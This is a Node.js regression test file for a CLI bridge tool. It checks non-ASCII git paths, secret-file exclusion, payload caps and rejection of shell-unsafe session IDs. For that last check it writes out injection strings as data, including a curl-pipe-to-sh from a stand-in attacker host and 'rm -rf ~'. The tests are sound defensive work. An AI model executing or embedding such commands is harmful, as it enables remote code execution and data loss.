// Regression tests for the defects found in the second (0.2.0 post-Phase-2)
// code review. Each test fails against the pre-fix code and passes after it.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { collectDiff, listUntracked } from '../scripts/lib/git.mjs'
import { CONFIG_DEFAULTS } from '../scripts/lib/config.mjs'
import * as sessions from '../scripts/lib/sessions.mjs'
import { transfer } from '../scripts/lib/transfer.mjs'
import { transferJson } from '../scripts/lib/json-output.mjs'
import { CODES } from '../scripts/lib/errors.mjs'
import { buildPayload, LIMITS } from '../scripts/lib/context.mjs'
import { review, formatSummary } from '../scripts/lib/review.mjs'
import { guardStream } from '../scripts/lib/sanitize.mjs'

function withTempHome(fn) {
  const home = mkdtempSync(join(tmpdir(), 'kb-fix2-'))
  const prev = process.env.KIRO_BRIDGE_HOME
  process.env.KIRO_BRIDGE_HOME = home
  try {
    return fn(home)
  } finally {
    if (prev === undefined) delete process.env.KIRO_BRIDGE_HOME
    else process.env.KIRO_BRIDGE_HOME = prev
    rmSync(home, { recursive: true, force: true })
  }
}

// A repo with one commit, so HEAD exists and `git diff HEAD` is meaningful.
// Awaited, so the async body cannot outlive the temp repo it depends on.
async function withRepo(fn) {
  const dir = mkdtempSync(join(tmpdir(), 'kb-repo-'))
  const git = (...args) => execFileSync('git', args, { cwd: dir, stdio: 'pipe' })
  try {
    git('init', '-q', '.')
    git('config', 'user.email', 'test@example.com')
    git('config', 'user.name', 'test')
    // core.quotePath defaults to true; leave it at the default on purpose —
    // these tests exist to prove we are immune to it.
    writeFileSync(join(dir, 'base.txt'), 'base\n')
    git('add', '-A')
    git('commit', '-qm', 'init')
    return await fn(dir, git)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

// --- 1. Non-ASCII paths: git C-quotes them unless -z is used ---------------
//
// With the newline-delimited default, `git diff --name-only` returns
// `"\355\225\234..."` for a non-ASCII path. That literal string matches no file
// on disk (so the content silently vanishes from the diff) and no `*.pem`
// exclude pattern (so a secret file silently bypasses the exclusion list).

test('git: a non-ASCII path keeps its real name, not the C-quoted form', async () => {
  await withRepo(async (dir, git) => {
    writeFileSync(join(dir, '한글파일.mjs'), 'const a = 1\n')
    git('add', '-A')
    const r = await collectDiff({ cwd: dir, excludeFiles: [] })
    assert.deepEqual(r.files.map((f) => f.path), ['한글파일.mjs'])
  })
})

test('git: a non-ASCII path\'s content actually reaches the diff', async () => {
  await withRepo(async (dir, git) => {
    writeFileSync(join(dir, '한글파일.mjs'), 'const a = 1\n')
    writeFileSync(join(dir, 'normal.mjs'), 'const b = 2\n')
    git('add', '-A')
    const r = await collectDiff({ cwd: dir, excludeFiles: [] })
    assert.ok(r.diff.includes('const a = 1'), 'non-ASCII file content must not be silently dropped')
    assert.ok(r.diff.includes('const b = 2'))
  })
})

test('git: exclusion patterns apply to non-ASCII secret filenames', async () => {
  await withRepo(async (dir, git) => {
    writeFileSync(join(dir, '인증서.pem'), 'SECRET\n')
    writeFileSync(join(dir, 'normal.pem'), 'SECRET\n')
    git('add', '-A')
    const r = await collectDiff({ cwd: dir, excludeFiles: CONFIG_DEFAULTS.redaction.excludeFiles })
    assert.deepEqual(r.excludedFiles.sort(), ['normal.pem', '인증서.pem'])
    assert.deepEqual(r.files, [], 'an excluded secret file must never reach the payload')
  })
})

test('git: a path containing spaces survives collection', async () => {
  await withRepo(async (dir, git) => {
    writeFileSync(join(dir, 'space file.mjs'), 'x\n')
    git('add', '-A')
    const r = await collectDiff({ cwd: dir, excludeFiles: [] })
    assert.deepEqual(r.files.map((f) => f.path), ['space file.mjs'])
  })
})

test('git: untracked non-ASCII files are listed under their real name', async () => {
  await withRepo(async (dir) => {
    writeFileSync(join(dir, '새파일.mjs'), 'x\n')
    const list = await listUntracked({ cwd: dir })
    assert.deepEqual(list, ['새파일.mjs'])
  })
})

// --- 2. sessionId is agent-supplied and gets rendered into a run command ---
//
// transfer prints `kiro-cli chat --resume-id <id>` for the user to copy and
// run. The id arrives verbatim from Kiro's session/new response, so an id
// carrying shell metacharacters would turn that line into an injection.

const INJECTIONS = [
  ['command chaining', 'abc; curl http://evil.example/x.sh | sh'],
  ['backticks', 'abc`whoami`'],
  ['dollar substitution', 'abc$(id)'],
  ['whitespace', 'abc 123'],
  ['newline', 'abc\nrm -rf ~'],
  ['single quote', "abc'"],
  ['redirection', 'abc > /tmp/pwned'],
]

for (const [label, evil] of INJECTIONS) {
  test(`sessions: refuses to store a sessionId with ${label}`, () => {
    withTempHome(() => {
      const record = sessions.registerSession({
        sessionId: evil,
        agent: 'kiro-bridge-reviewer',
        source: { kind: 'review', command: 'review' },
        transport: 'acp',
      })
      assert.equal(record, null, 'a shell-unsafe session id must never be persisted')
    })
  })
}

const LEGITIMATE = [
  ['UUID', '550e8400-e29b-41d4-a716-446655440000'],
  ['ULID-ish', '01HQ8XK3M4N5P6Q7R8S9T0V1W2'],
  ['base64url', 'YWJjZGVmZ2hpamts_-XY'],
  ['standard base64', 'YWJjZGVm+/=='],
  ['dotted/colon namespaced', 'sess.v2:01HQ'],
]

for (const [label, id] of LEGITIMATE) {
  test(`sessions: still accepts a legitimate ${label} sessionId`, () => {
    withTempHome(() => {
      const record = sessions.registerSession({
        sessionId: id,
        agent: 'kiro-bridge-reviewer',
        source: { kind: 'review', command: 'review' },
        transport: 'acp',
      })
      assert.ok(record, `${label} must not be rejected`)
      assert.equal(record.sessionId, id)
    })
  })
}

test('transfer: renders a run command only for a validated session id', () => {
  withTempHome(() => {
    sessions.registerSession({
      sessionId: 'sess-01HQ8XK3',
      agent: 'kiro-bridge-reviewer',
      source: { kind: 'review', command: 'review' },
      transport: 'acp',
    })
    const res = transfer({})
    assert.equal(res.command, 'kiro-cli chat --resume-id sess-01HQ8XK3')
    // No shell metacharacter may appear anywhere in the rendered command.
    assert.ok(!/[;|&$`<>(){}\s'"\\]/.test(res.sessionId))
  })
})

// The record store is a plain directory of 0600 JSON files, so a hand-edited
// (or otherwise tampered) record is a real path into transfer. Validation runs
// on read as well as on write, so such a record is ignored rather than trusted.
test('transfer: a hand-edited record with a shell-unsafe id is ignored, not rendered', () => {
  withTempHome(() => {
    const recordId = '01700000000000000-deadbeef'
    const dir = sessions.sessionsDir()
    mkdirSync(dir, { recursive: true })
    writeFileSync(join(dir, `${recordId}.json`), JSON.stringify({
      recordId,
      sessionId: 'abc; rm -rf ~',
      agent: 'kiro-bridge-reviewer',
      source: { kind: 'review', command: 'review' },
      write: false,
      transport: 'acp',
      createdAt: new Date().toISOString(),
    }))

    assert.equal(sessions.readRecord(recordId), null, 'read path must reject it too')
    // Nothing resolvable remains, so transfer refuses instead of printing a
    // command built from the tampered id.
    assert.throws(() => transfer({}), (err) => err.code === CODES.PROTOCOL)
  })
})

test('transferJson: marks the envelope external — sessionId is agent-supplied', () => {
  withTempHome(() => {
    sessions.registerSession({
      sessionId: 'sess-01HQ8XK3',
      agent: 'kiro-bridge-reviewer',
      source: { kind: 'review', command: 'review' },
      transport: 'acp',
    })
    const envelope = transferJson(transfer({}))
    assert.equal(envelope.external, true)
    assert.ok(envelope.notice)
  })
})

// --- 3. Payload file cap: silent truncation + exclusions eating the budget --

test('context: reports how many changed files the cap left out', () => {
  const files = Array.from({ length: LIMITS.files + 7 }, (_, i) => ({
    path: `src/f${i}.mjs`, reason: 'changed in diff',
  }))
  const { payload, droppedFiles } = buildPayload(
    { kind: 'review', goal: 'g', diff: 'd', files },
    { redaction: {} },
  )
  assert.equal(payload.files.length, LIMITS.files)
  assert.equal(droppedFiles, 7, 'the omission must be reported, not silent')
})

test('context: droppedFiles is 0 when everything fits', () => {
  const files = [{ path: 'a.mjs' }, { path: 'b.mjs' }]
  const { droppedFiles } = buildPayload(
    { kind: 'review', goal: 'g', files }, { redaction: {} },
  )
  assert.equal(droppedFiles, 0)
})

test('context: excluded files do not consume the file cap', () => {
  // Every excluded path used to be counted against the cap before being
  // dropped, so a leading run of them could push out every reviewable file.
  const files = [
    ...Array.from({ length: LIMITS.files }, (_, i) => ({ path: `secrets/${i}.pem` })),
    { path: 'src/real.mjs', reason: 'changed in diff' },
  ]
  const { payload, excludedFiles, droppedFiles } = buildPayload(
    { kind: 'review', goal: 'g', files },
    { redaction: { excludeFiles: ['*.pem'] } },
  )
  assert.equal(excludedFiles.length, LIMITS.files)
  assert.deepEqual(payload.files.map((f) => f.path), ['src/real.mjs'])
  assert.equal(droppedFiles, 0)
})

test('review: surfaces the capped file count in the human summary', async () => {
  const files = Array.from({ length: LIMITS.files + 3 }, (_, i) => ({
    path: `src/f${i}.mjs`, reason: 'changed in diff',
  }))
  const res = await review({
    collectDiffFn: async () => ({ diff: 'diff text', files, untracked: [], excludedFiles: [], ref: 'HEAD' }),
    runFn: async () => ({
      transport: 'acp', sessionId: null,
      result: '{"findings":[],"summary":"s"}',
    }),
    config: { redaction: {}, logRetentionDays: 30 },
  })
  assert.equal(res.droppedFiles, 3)
  assert.match(formatSummary(res), /file list capped: 3 not listed/)
})

// --- 4. guardStream: multi-byte characters split across write boundaries ----

test('sanitize: a multi-byte char split across two byte writes is not corrupted', () => {
  const chunks = []
  const fake = { write: (c) => { chunks.push(c); return true } }
  guardStream(fake)
  const buf = Buffer.from('한글 테스트', 'utf8')
  fake.write(buf.subarray(0, 2)) // first 2 of the 3 bytes of '한'
  fake.write(buf.subarray(2))
  assert.equal(chunks.join(''), '한글 테스트')
})
